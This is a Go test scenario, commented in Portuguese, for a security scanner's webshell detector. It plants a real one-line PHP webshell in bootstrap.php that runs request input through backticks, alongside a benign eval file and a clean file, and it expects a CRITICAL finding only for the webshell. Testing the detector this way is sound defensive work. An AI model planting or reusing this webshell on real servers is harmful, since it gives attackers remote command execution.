package scenario

// Backdoor em código servido — a peneira de webshell (app.code_backdoor).
//
//	B1  o webshell REAL de uma linha acrescentado a um bootstrap.php: crase
//	    (shell_exec do PHP) sobre $_REQUEST. É o caso que originou o check.
//
// O plantio usa printf com \140 (octal da crase) porque a raw string do Go não
// aceita backtick, e a crase é justamente o que torna a linha um shell.

func init() {
	Register(Scenario{
		ID:     "B1-webshell-php",
		Desc:   "webshell de uma linha em bootstrap.php: crase sobre $_REQUEST vira CRÍTICO; eval puro fica em aviso",
		Images: matriz,
		Plant: "mkdir -p /var/www/app\n" +
			// o webshell real do usuário: echo `$_REQUEST[0]`
			"printf '<?php\\nif(isset($_REQUEST[0])){echo \\140$_REQUEST[0]\\140;die;}\\n' > /var/www/app/bootstrap.php\n" +
			// eval puro, SEM entrada de request: tem de sair só como aviso
			"printf '<?php\\n$x = eval(\"return 1+1;\");\\n' > /var/www/app/painel.php\n" +
			// código limpo: não pode gerar nada
			"printf '<?php\\nclass Foo { function bar(){ return 1; } }\\n' > /var/www/app/limpo.php",
		Expect: []Expect{
			{ID: "app.code_backdoor", Sev: "CRITICAL", Subject: "/var/www/app/bootstrap.php"},
			// o trecho e a linha, que é o que o operador lê
			{ID: "app.code_backdoor", Evidence: "$_REQUEST[0]"},
			{ID: "app.code_backdoor", Evidence: "crase sobre entrada"},
			// a honestidade do check precisa sair junto
			{ID: "app.code_backdoor", Evidence: "PENEIRA"},
		},
		// painel.php (eval puro) é INFO e some no padrão; limpo.php não gera
		// nada. Nenhum dos dois pode alarmar — é o que separa peneira de ruído.
		ForbidOutput: []string{"painel.php", "limpo.php"},
		Exit:         2,
	})
}
